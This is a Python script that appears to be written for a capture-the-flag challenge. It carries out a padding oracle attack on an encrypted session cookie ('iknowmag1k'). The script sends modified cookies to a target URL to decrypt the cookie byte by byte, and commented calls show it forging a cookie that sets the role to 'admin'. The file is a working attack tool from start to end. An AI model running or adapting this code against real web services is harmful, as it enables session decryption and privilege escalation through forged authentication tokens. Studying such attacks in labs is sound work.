import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
import base64
import binascii
import urllib.parse
# https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html?currentPage=2

URL = "http://X"
BLOCKSIZE = 8
COOKIES = {}
VERBOSE = False

# https://www.peterbe.com/plog/best-practice-with-retries-with-requests
def requests_retry_session(retries=15, backoff_factor=0.3, status_forcelist=(502, 504), session=None):
    session = session or requests.Session()
    retry = Retry(
        total=retries,
        read=retries,
        connect=retries,
        backoff_factor=backoff_factor,
        status_forcelist=status_forcelist,
    )
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

S = requests_retry_session()


def get_blocks(b64, bsize):
    # AES block size = 8/16/24/32
    b = base64.b64decode(b64)
    print("Input size: {}".format(len(b)))
    byte_blocks = [b[idx:idx+bsize] for idx in range(0,len(b), bsize)]
    int_blocks = [[byte for byte in block] for block in byte_blocks]
    if VERBOSE:
        for idx in range(len(byte_blocks)): print("Block {} size: {} = {}".format(idx, len(byte_blocks[idx]), str2hex(byte_blocks[idx])))
    return int_blocks

def get_padded(pt, bsize):
    # PKCS#7
    len_blocks = (len(pt) // bsize) + 1
    pad = bsize - (len(pt) % bsize)
    pt += chr(pad) * pad
    int_blocks = []
    for i in range(0, len_blocks * bsize, bsize):
        int_block = [ord(byte) for byte in pt[i:i+bsize]]
        int_blocks.append(int_block)
    #int_blocks.append([0] * bsize)
    return int_blocks

def get_payload(block_prev, block, byte, i):
    tmp = block_prev
    tmp[byte] = i
    if VERBOSE: print("[+] Trying: {}".format(str2hex(tmp)))
    b64 = base64.b64encode(bytearray(tmp + block))
    payload = urllib.parse.quote_plus(b64)
    return payload

def pt2intermediate_block(pt, original_prev):
    intermediate = [0] * BLOCKSIZE
    for i in range(BLOCKSIZE-1, -1, -1):
        tmp = intermediate[:]
        x = ord(pt[i]) ^ ord(original_prev[i])
        intermediate[i] = x
        for j in range(BLOCKSIZE-1, i-1, -1):
            tmp[j] = intermediate[j] ^ (BLOCKSIZE-i)
        print(tmp)
    print("\nintermediate:{}".format(intermediate))
    return intermediate

def str2hex(s):
    if not isinstance(s, list):
        return s
    else:
        return base64.b16encode(bytearray(s))

def decrypt_byte(byte_i, byte_ct):
    pt = byte_i ^ byte_ct
    print("[!] Decrypted byte: {}".format((chr(pt))))
    return pt

def adjust_padding(block_prev, block_int, byte_idx):
    byte_pad = (BLOCKSIZE-byte_idx+1)
    for pad_idx in range(BLOCKSIZE-1, byte_idx-1, -1):
        block_prev[pad_idx] = block_int[pad_idx] ^ byte_pad
    if VERBOSE: print("[+] new padding: {}".format([x for x in block_prev]))
    return block_prev

def get_intermediate_block(block_prev, block):
    s = requests_retry_session()
    intermediate = bytearray(BLOCKSIZE)
    for byte in range(BLOCKSIZE-1, -1, -1):
        for i in range(256):
            payload =  get_payload(block_prev, block, byte, i)
            if not oracle(payload): continue
            # found valid padding byte
            print("[+] Success ({}/256) [byte {}]".format(i, byte))
            int_val = i ^ (BLOCKSIZE-byte)
            intermediate[byte] = int_val
            if VERBOSE: print("[+] intermediate: {}".format([x for x in intermediate]))
            # adjust new padding
            padding_value = (BLOCKSIZE-byte+1)
            for pad_byte in range(BLOCKSIZE-1, byte-1, -1):
                block_prev[pad_byte] = intermediate[pad_byte] ^ padding_value
            if VERBOSE: print("[+] new padding: {}".format([x for x in block_prev]))
            break
    return intermediate

def get_intermediate_byte(block_prev, block, byte):
    for i in range(256):
        payload = get_payload(block_prev, block, byte, i)
        if not oracle(payload): continue
        # found valid padding byte
        print("[+] Success ({}/255) [byte {}]".format(i, byte))
        int_val = i ^ (BLOCKSIZE-byte)
        if VERBOSE: print("[+] intermediate byte: {}".format(int_val))
        break
    return int_val

def decrypt(arg):
    blocks_i = [] # fill with known values to resume decryption from a specific block
    blocks_pt = []
    for block_idx in range(len(blocks_pt)+1, len(blocks)):
        block_prev = [0] * BLOCKSIZE
        block_ct = blocks[block_idx]
        print("[!] Starting cipher-text block {} ({} of {})".format(str2hex(block_ct), block_idx, len(blocks)-1))
        block_i = [0] * BLOCKSIZE
        block_pt = [0] * BLOCKSIZE
        for byte_idx in range(BLOCKSIZE-1, -1, -1):
            block_i[byte_idx] = get_intermediate_byte(block_prev, block_ct, byte_idx)
            block_prev = adjust_padding(block_prev, block_i, byte_idx)
            block_pt[byte_idx] = decrypt_byte(block_i[byte_idx], blocks[block_idx-1][byte_idx])
        blocks_i.append(block_i)
        blocks_pt.append("".join([chr(x) for x in block_pt]))
        print("[*] Intermediate: {}".format(str2hex(block_i)))
        print("[*] Plain-text: {}".format("".join([chr(x) for x in block_pt])))
    print("=== DONE ===")
    print("[!] Intermediate: {}".format([str2hex(x) for x in blocks_i]))
    print("[!] Decrypted: {}".format(blocks_pt))
    print("[!] Decrypted: {}".format("".join(blocks_pt)))

def encrypt(blocks_pt):
    print("pt:{}".format(blocks_pt))
    blocks_ct = [[1, 2, 3, 4, 5, 6, 7]]
    for block_idx in range(len(blocks_pt)-1, -1, -1):
        print("[!] Encrypting block {} of {}".format(block_idx, len(blocks_pt)-1))
        block_prev = [0] * BLOCKSIZE
        block_i = get_intermediate_block(block_prev, blocks_ct[0])
        tmp = [0] * BLOCKSIZE
        for byte_idx in range(BLOCKSIZE-1, -1, -1):
            tmp[byte_idx] = block_i[byte_idx] ^ blocks_pt[block_idx][byte_idx]
        blocks_ct.insert(0, tmp)
    print("ct:{}".format(blocks_ct))
    print("Done:{}".format(base64.b64encode(bytearray([item for sublist in blocks_ct for item in sublist]))))

def oracle(payload):
    # function returns true if padding is valid
    tmp = COOKIES
    tmp['iknowmag1k'] = payload
    if (VERBOSE): print(tmp)
    res = S.get(URL, cookies=tmp)
    return res.ok


#blocks = get_blocks("XB1VR76f09nc30onWwtZg0nUx9YdV2luyu6whqYZ//GMG5e6YQ16wg==", BLOCKSIZE)
#decrypt(blocks)

#blocks = get_padded('{"user":"test","role":"admin"}', BLOCKSIZE)
#encrypt(blocks)
